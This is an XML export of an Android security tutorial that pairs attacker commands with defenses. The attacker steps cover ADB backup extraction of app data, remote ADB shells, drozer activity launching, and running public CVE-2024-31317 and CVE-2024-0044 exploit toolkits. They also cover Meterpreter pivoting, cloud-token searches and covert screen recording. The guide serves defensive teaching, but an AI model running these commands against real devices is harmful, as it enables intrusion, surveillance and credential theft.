      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Attacker's Command:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/># Check if a device is connected and authorized</text:p>
      <text:p text:style-name="Preformatted_20_Text">adb devices</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"># List all installed third-party packages to find a target</text:p>
      <text:p text:style-name="Preformatted_20_Text">adb shell pm list packages -3</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"># Attempt a full backup of a specific app (e.g., a vulnerable note-taking app)</text:p>
      <text:p text:style-name="Preformatted_20_Text">adb backup -f note_backup.ab com.example.vulnerable.notepad</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/>On the Android device, the user might see a prompt asking to "Allow backup?" If they confirm (or if it's a headless device), the backup proceeds.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Attacker's Post-Processing: The backup file (note_backup.ab) is in Android Backup format. The attacker can extract it using abe (Android Backup Extractor).</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/><text:s text:c="6"/># Convert the backup to a tar archive</text:p>
      <text:p text:style-name="Preformatted_20_Text">java -jar abe.jar unpack note_backup.ab note_backup.tar</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"># Extract the tar file to see all the app's private data (databases, shared_prefs, etc.)</text:p>
      <text:p text:style-name="Preformatted_20_Text">tar -xvf note_backup.tar</text:p>
      <text:p text:style-name="Preformatted_20_Text">Defense 1.1: Disable Backup and Audit Manifest</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Developer's Command (In AndroidManifest.xml): The primary defense is for app developers to explicitly disable backups for sensitive apps.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/>&lt;application ...</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>android:allowBackup="false"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>android:fullBackupContent="false"&gt;</text:p>
      <text:p text:style-name="Preformatted_20_Text">&lt;/application&gt;</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Auditor's Command (Static Analysis with aapt): A security auditor can quickly check an APK's manifest for this misconfiguration without needing the source code.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/># Use aapt (Android Asset Packaging Tool) to extract and grep the manifest</text:p>
      <text:p text:style-name="Preformatted_20_Text">aapt dump badging /path/to/app.apk | grep allowBackup</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/>If the output shows allowBackup='true' or nothing (as true is often the default for older targets), the app is vulnerable.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">Attack 1.2:</text:span><text:span text:style-name="T4"> ADB over Network (Remote Access)</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text">If an attacker gains a foothold on the same Wi-Fi network as the victim's device and ADB-over-network is enabled, they can connect remotely.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Attacker's Command (After finding the device's IP):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/># Connect to the device's ADB port (usually 5555)</text:p>
      <text:p text:style-name="Preformatted_20_Text">adb connect 192.168.1.100:5555</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"># If successful, they now have a remote shell</text:p>
      <text:p text:style-name="Preformatted_20_Text">adb shell</text:p>
      <text:p text:style-name="Preformatted_20_Text">Defense 1.2: Disable ADB over Network and Monitor Connections</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• User's Command (On the Android Device): The user should ensure "ADB over network" is disabled in Developer Options. It is off by default.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Administrator's Command (Network Monitoring): On a corporate network, an IDS can alert on connections to port 5555.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/># Using tcpdump on a network gateway to monitor for ADB traffic</text:p>
      <text:p text:style-name="Preformatted_20_Text">sudo tcpdump -i eth0 port 5555</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">Phase 2:</text:span> Deep Reconnaissance - Information Gathering on the Device</text:p>
      <text:p text:style-name="Preformatted_20_Text">Once a connection is established (physically or remotely), the attacker will perform detailed reconnaissance.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">Attack 2.1:</text:span> Extracting All Installed Packages and their Paths</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Attacker's Command:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/># Get a clean list of all third-party app package names</text:p>
      <text:p text:style-name="Preformatted_20_Text">adb shell pm list packages -3 -f &gt; app_list.txt</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"># For a specific app, find the exact location of its APK</text:p>
      <text:p text:style-name="Preformatted_20_Text">adb shell pm path com.example.target.app</text:p>
      <text:p text:style-name="Preformatted_20_Text"># This might output: package:/data/app/com.example.target.app-xyz/base.apk</text:p>
      <text:p text:style-name="Preformatted_20_Text">Attack 2.2: Pulling APKs for Offline Reverse Engineering</text:p>
      <text:p text:style-name="Preformatted_20_Text">An attacker will pull the APK files to analyze them for further vulnerabilities.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Attacker's Command:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/># Pull the APK from the path found in the previous step</text:p>
      <text:p text:style-name="Preformatted_20_Text">adb pull /data/app/com.example.target.app-xyz/base.apk target_app.apk</text:p>
      <text:p text:style-name="Preformatted_20_Text">Attack 2.3: Dumping System Information</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Attacker's Command:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/># Get detailed build properties (Android version, SDK, etc.)</text:p>
      <text:p text:style-name="Preformatted_20_Text">adb shell getprop | grep -E "ro.build.version|ro.product.model"</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/># List all permissions granted to a specific app</text:p>
      <text:p text:style-name="Preformatted_20_Text">adb shell dumpsys package com.example.target.app | grep -A 10 "runtime permissions"</text:p>
      <text:p text:style-name="Preformatted_20_Text">Defense 2: Runtime Monitoring and Alerting</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Defender's Command (Using logcat for Anomalous Activity): A user with a rooted device can monitor system logs for unusual access patterns, though this is noisy.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/># Monitor logs for 'pm' (package manager) or 'pull' activities (requires root on device to see all)</text:p>
      <text:p text:style-name="Preformatted_20_Text">adb logcat | grep -E "pm|pull"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Proactive Defense (Using a tool like Sandroid ): A security researcher can use dynamic analysis tools to profile what an app normally does. Deviations can then be detected. Sandroid (Dexray-Intercept) hooks into app behavior .</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/># Profile an app's filesystem and network activity on a rooted test device</text:p>
      <text:p text:style-name="Preformatted_20_Text">dexray-intercept --hooks-filesystem --hooks-network com.example.target.app</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">Phase 3:</text:span> Application Layer Attacks - Exploiting Weak Code</text:p>
      <text:p text:style-name="Preformatted_20_Text">This is where the attacker analyzes the pulled APK to find vulnerabilities in the app's own code.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">Attack 3.1:</text:span> Exploitable Activity Exposure with Drozer</text:p>
      <text:p text:style-name="Preformatted_20_Text">An attacker can use drozer <text:s/>to interact with an app's IPC endpoints without needing to fully reverse engineer it.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Attacker's Setup:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/># On the attacker's machine, forward the drozer port</text:p>
      <text:p text:style-name="Preformatted_20_Text">adb forward tcp:31415 tcp:31415</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"># Connect the drozer console</text:p>
      <text:p text:style-name="Preformatted_20_Text">drozer console connect</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Attacker's Commands (Inside Drozer Console):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/># List all packages</text:p>
      <text:p text:style-name="Preformatted_20_Text">run app.package.list</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"># Find attack surface of a target app</text:p>
      <text:p text:style-name="Preformatted_20_Text">run app.package.attacksurface com.example.target.app</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"># If an Activity is exported, attempt to start it directly</text:p>
      <text:p text:style-name="Preformatted_20_Text">run app.activity.start --component com.example.target.app com.example.target.app.SettingsActivity</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/>If the attacker can start a privileged settings activity without authentication, that's a major vulnerability.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Defense 3.1: Proper Android Component Export Configuration</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Developer's Commands (in AndroidManifest.xml): The core defense is explicitly setting exported="false" for components that should not be launched by other apps.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/>&lt;activity</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>android:name=".SettingsActivity"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>android:exported="false" /&gt;</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/>For activities that must be exported (e.g., a share handler), use permission checks:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/>&lt;activity</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>android:name=".ShareActivity"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>android:exported="true"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>android:permission="android.permission.INTERACT_ACROSS_USERS_FULL" /&gt;</text:p>
      <text:p text:style-name="Preformatted_20_Text">Attack 3.2: Exploiting Insecure Data Storage</text:p>
      <text:p text:style-name="Preformatted_20_Text">An attacker analyzes the app's private data (pulled via ADB backup or by examining the filesystem on a rooted device) to find secrets.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Attacker's Command (After gaining access to app's data directory):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/># Look for databases</text:p>
      <text:p text:style-name="Preformatted_20_Text">find /data/data/com.example.target.app -name "*.db"</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/># Query a database for credentials</text:p>
      <text:p text:style-name="Preformatted_20_Text">sqlite3 /data/data/com.example.target.app/databases/secure_storage.db "SELECT * FROM accounts;"</text:p>
      <text:p text:style-name="Preformatted_20_Text">Defense 3.2: Use Android Keystore System</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Developer's Code (Kotlin Example): Instead of storing keys or passwords in SharedPreferences or a database, they should be stored in the Android Keystore.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/>// Get an instance of the Keystore</text:p>
      <text:p text:style-name="Preformatted_20_Text">val keyStore = KeyStore.getInstance("AndroidKeyStore")</text:p>
      <text:p text:style-name="Preformatted_20_Text">keyStore.load(null)</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">// Generate a key (example for HMAC)</text:p>
      <text:p text:style-name="Preformatted_20_Text">val keyGenerator = KeyGenerator.getInstance(</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>KeyProperties.KEY_ALGORITHM_HMAC_SHA256, "AndroidKeyStore")</text:p>
      <text:p text:style-name="Preformatted_20_Text">val keyGenSpec = KeyGenParameterSpec.Builder("app_key",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>KeyProperties.PURPOSE_SIGN).build()</text:p>
      <text:p text:style-name="Preformatted_20_Text">keyGenerator.init(keyGenSpec)</text:p>
      <text:p text:style-name="Preformatted_20_Text">val secretKey = keyGenerator.generateKey()</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/>This key never enters the app's process memory in a usable form, making extraction extremely difficult.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Phase 4: Advanced System-Level Exploits</text:p>
      <text:p text:style-name="Preformatted_20_Text">These attacks target the Android operating system itself, using known CVEs.</text:p>
      <text:p text:style-name="Preformatted_20_Text">**Attack 4.1: Exploiting CVE-2024-31317 (Zygote Injection) **</text:p>
      <text:p text:style-name="Preformatted_20_Text">This vulnerability allows an attacker with ADB access to inject code into the privileged Zygote process, gaining system user privileges.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Attacker's Commands:</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/><text:span text:style-name="T5"># Install the toolkit</text:span></text:p>
      <text:p text:style-name="P23">pip install --upgrade git+https://github.com/Anonymous941/zygote-injection-toolkit.git</text:p>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P23"># Ensure a device is connected and ADB is running</text:p>
      <text:p text:style-name="P23">adb start-server</text:p>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P23"># Run the exploit</text:p>
      <text:p text:style-name="P23">python -m zygote_injection_toolkit</text:p>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/>If successful, the attacker gets a reverse shell on port 1234 with system privileges, allowing them to read/write any app's private data.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P4">Defense 4.1: Apply Security Patches</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="Preformatted_20_Text">The only defense against a patched CVE is to install the security update.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/><text:span text:style-name="T2">• User's Command (Check Patch Level):</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/>adb shell getprop ro.build.version.security_patch</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/>This should be after June 1, 2024 to be protected against CVE-2024-31317.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">**Attack 4.2:</text:span> Exploiting CVE-2024-0044 with EvilDroid **</text:p>
      <text:p text:style-name="Preformatted_20_Text">This is an Android framework vulnerability that allows an attacker to install a malicious app that can then gain elevated privileges.</text:p>
      <text:p text:style-name="P4">• Attacker's Commands:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/># Clone the EvilDroid repository</text:p>
      <text:p text:style-name="Preformatted_20_Text">git clone https://github.com/sridhar-sec/EvilDroid.git</text:p>
      <text:p text:style-name="Preformatted_20_Text">cd EvilDroid</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"># Run the exploit against a target app (e.g., WhatsApp)</text:p>
      <text:p text:style-name="Preformatted_20_Text">python3 evildroid.py -p com.whatsapp -a /path/to/malicious/payload.apk</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">Defense 4.2:</text:span> <text:span text:style-name="T4">SELinux Policy Hardening</text:span></text:p>
      <text:p text:style-name="P24">Modern Android versions use fine-grained SELinux policies to block such exploits. Google's official documentation shows how OEMs can harden their devices . A macro <text:soft-page-break/>like set_xperm_filter is used to block restricted IOCTLs that exploits rely on.</text:p>
      <text:p text:style-name="P24"># Example from AOSP for GPU filtering, a similar principle applies</text:p>
      <text:p text:style-name="P24">set_xperm_filter(</text:p>
      <text:p text:style-name="P24"><text:s text:c="2"/>gpu_device,</text:p>
      <text:p text:style-name="P24"><text:s text:c="2"/>untrusted_app_sdk_gate,</text:p>
      <text:p text:style-name="P24"><text:s text:c="2"/>unpriv_ioctls,</text:p>
      <text:p text:style-name="P24"><text:s text:c="2"/>restricted_ioctls,</text:p>
      <text:p text:style-name="P24"><text:s text:c="2"/>instrumentation_ioctls)</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P7">Phase 5: Post-Exploitation &amp; Lateral Movement</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="Preformatted_20_Text">Once a foothold is established, the attacker moves from the device to the network or cloud.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">Attack 5.1: </text:span><text:span text:style-name="T4">Port Forwarding for Pivoting</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text">The attacker uses the compromised Android device as a pivot point to attack other devices on the victim's local network.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/><text:span text:style-name="T2">• Attacker's Command (Using Meterpreter session):</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/># Inside a Meterpreter session on the Android device</text:p>
      <text:p text:style-name="Preformatted_20_Text">portfwd add -L 0.0.0.0 -l 8080 -p 80 -r 192.168.1.50</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/>This forwards traffic from the attacker's machine on port 8080 to a target internal server (192.168.1.50) through the compromised Android device's connection.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Attack 5.2: Credential Harvesting from Cloud Apps</text:p>
      <text:p text:style-name="Preformatted_20_Text">The attacker looks for OAuth tokens or cloud service credentials stored on the device.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/><text:span text:style-name="T2">• Attacker's Command:</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/># Search for common cloud configuration files</text:p>
      <text:p text:style-name="Preformatted_20_Text">find /data/data -name "*aws*" -o -name "*google*" -o -name "*token*" 2&gt;/dev/null</text:p>
      <text:p text:style-name="Preformatted_20_Text">Defense 5: Network Segmentation &amp; Cloud Security Posture Management (CSPM)</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/><text:span text:style-name="T2">• Network Defense:</text:span> The best defense against pivoting is strict network segmentation. IoT devices and mobile devices should be on a separate VLAN from critical servers, with firewall rules preventing direct lateral movement.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/><text:span text:style-name="T2">• Cloud Defense:</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>◦ Short-lived tokens: Cloud services should issue tokens with very short expiration times.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>◦ Conditional Access: Policies should block access from untrusted locations or devices that show signs of compromise.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P7">Phase 6: Detection and Hardening Tools</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">Defense 6.1:</text:span> <text:span text:style-name="T4">Static Analysis with MobSF</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text">Before even installing an app, a security team can scan it with MobSF (Mobile Security Framework) .</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/><text:span text:style-name="T2">• Defender's Command:</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/># Run MobSF in a Docker container</text:p>
      <text:p text:style-name="Preformatted_20_Text">docker pull opensecurity/mobile-security-framework-mobsf</text:p>
      <text:p text:style-name="Preformatted_20_Text">docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"># Access the web UI at http://localhost:8000 and upload the APK.</text:p>
      <text:p text:style-name="Preformatted_20_Text"># MobSF will generate a comprehensive report on permissions, code issues, and malware indicators.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P4">Defense 6.2: Runtime Monitoring with Sandroid </text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/>For dynamic analysis, Sandroid (Dexray-Intercept) hooks into an app's behavior in real-time.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Defender's Command:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/># Profile all crypto and network activity of a suspicious app</text:p>
      <text:p text:style-name="Preformatted_20_Text">dexray-intercept --hooks-crypto --hooks-network com.suspicious.app.package</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"># The tool will output detailed logs of every AES encryption, HTTP request, etc.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P4">Defense 6.3: System Hardening with SELinux Auditing </text:p>
      <text:p text:style-name="Preformatted_20_Text">Check for actual permission violations on a live device.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/><text:span text:style-name="T2">• Defender's Command:</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/># Enable full SELinux enforcement (it should be on by default)</text:p>
      <text:p text:style-name="Preformatted_20_Text">adb shell setenforce 1</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"># Monitor the logs for AVC (Access Vector Cache) denials</text:p>
      <text:p text:style-name="Preformatted_20_Text">adb logcat | grep "avc: denied"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/>Any output here shows a policy violation, which could be a malicious app trying to break out of its sandbox or a legitimate app with a bug.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P4">Defense 6.4: The Ultimate On-Device Defense: Kali NetHunter </text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="Preformatted_20_Text">Paradoxically, one of the best ways to secure your own device is to turn it into a security testing platform. Kali NetHunter, installed on a rooted device with a custom kernel, gives you the power to audit your own network and test for the very attacks we've discussed.</text:p>
      <text:p text:style-name="Preformatted_20_Text">• User's Action: Install NetHunter on a compatible device.</text:p>
      <text:p text:style-name="Preformatted_20_Text">• NetHunter's Capabilities (Defensive Use):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="2"/>◦ Wi-Fi Monitoring: Use NetHunter's built-in tools to see if any "Evil Twin" <text:s text:c="3"/>access points are trying to lure your devices.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="2"/>◦ Traffic Inspection: Run tcpdump directly on the device to capture and analyze all network traffic, checking for suspicious outbound connections.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="2"/>◦ Exploit Prevention: By understanding how tools like EvilDroid work, a NetHunter user can better recognize the signs of compromise.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P4">Conclusion</text:p>
      <text:p text:style-name="Preformatted_20_Text">This deep-dive demonstrates the cat-and-mouse game of Android security. The attacker's commands show a path of increasing sophistication: from simple ADB commands to exploit CVE-2024-0044 and CVE-2024-31317, gaining system privileges, and finally pivoting into the cloud. The defender's counter-commands show a multi-layered strategy: secure coding (manifest fixes, Keystore), system patching, runtime monitoring (Sandroid), static analysis (MobSF), and leveraging powerful platforms like Kali NetHunter for proactive defense. The command line is the ultimate tool for both sides of this battle.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P25">SCREEN AND CAMERA EXPLOITATIONS</text:p>
      <text:p text:style-name="Preformatted_20_Text">The ability to surreptitiously capture a device's screen and camera represents one of the most critical threats to mobile privacy. These are not just theoretical risks; they are well-documented techniques used by real-world malware and are available in penetration testing frameworks .</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P26"><text:span text:style-name="T3">Let's break this down into two clear sections: Screen Capture and Camera Access.</text:span> </text:p>
      <text:p text:style-name="P26"/>
      <text:p text:style-name="P26">For each, we will explore the attacker's methods and then the defender's countermeasures, using precise command-line implementations where applicable.</text:p>
      <text:p text:style-name="Preformatted_20_Text">A quick but crucial note: All the following commands are for educational purposes and authorized security testing only. Using them against devices you do not own is <text:soft-page-break/>illegal.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P4">Part 1: Screen Capture Exploitation</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="Preformatted_20_Text">An attacker wants to see exactly what you are seeing—your private messages, banking details, or one-time passwords. They have several methods to achieve this, each with its own level of sophistication.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">Attack 1.1:</text:span><text:span text:style-name="T3"> ADB-Based Screen Capture (Requires USB Debugging or Compromised ADB)</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text">If an attacker has already gained a foothold on your system (e.g., via malware) and your device has USB Debugging enabled, or if they can run ADB commands through a compromised computer you are connected to, they can directly capture your screen.</text:p>
      <text:p text:style-name="Preformatted_20_Text">The Attacker's Commands:</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/><text:span text:style-name="T2">1.</text:span> Check for Connected Devices: First, the attacker verifies a device is connected and authorized for ADB.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="7"/><text:span text:style-name="T6">adb devices</text:span></text:p>
      <text:p text:style-name="P27"><text:s text:c="7"/>Output: This will list the device serial number with the status "device".</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/><text:span text:style-name="T2">2.</text:span> Capture a Screenshot: The attacker uses the Android Debug Bridge to execute the screencap utility directly on the device.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/><text:span text:style-name="T6"><text:s/># Take a screenshot and save it to the device's storage</text:span></text:p>
      <text:p text:style-name="P27">adb shell screencap /sdcard/screen.png</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P27"># Pull (download) the file from the device to the attacker's machine</text:p>
      <text:p text:style-name="P27">adb pull /sdcard/screen.png</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/><text:span text:style-name="T2"><text:s/>Explanation:</text:span> adb shell allows the attacker to run any Linux command on the Android device. screencap is a native Android tool that instantly captures the current screen and saves it as a PNG file .</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/><text:span text:style-name="T2">3.</text:span> Record a Screencast: For more dynamic information, the attacker can record a video of the screen.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/><text:span text:style-name="T6"><text:s text:c="3"/># Record the screen for 20 seconds at 720p resolution</text:span></text:p>
      <text:p text:style-name="P27">adb shell screenrecord --size 720x1280 --time-limit 20 /sdcard/screen_video.mp4</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27"># Pull the video file</text:p>
      <text:p text:style-name="P27">adb pull /sdcard/screen_video.mp4</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">Defense 1.1:</text:span> ADB Hardening and User Vigilance</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Defending against ADB-based attacks relies on preventing the attacker from having ADB access in the first place.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/><text:span text:style-name="T2">• The Defender's Commands (on the device):</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/><text:span text:style-name="T2"><text:s text:c="2"/>1.</text:span> Disable USB Debugging: This is the single most important step. If USB Debugging is off, an attacker cannot use ADB commands unless they first trick the user into enabling it. Go to Settings &gt; Developer Options &gt; USB Debugging and ensure it is OFF. If you are a developer, only enable it when you are actively using it for development.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/><text:span text:style-name="T2">2.</text:span> Revoke USB Debugging Authorizations: If you've ever connected your device to a computer, it may have been authorized. You can clear all authorizations to be safe.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/># This command revokes all previously granted USB debugging permissions</text:p>
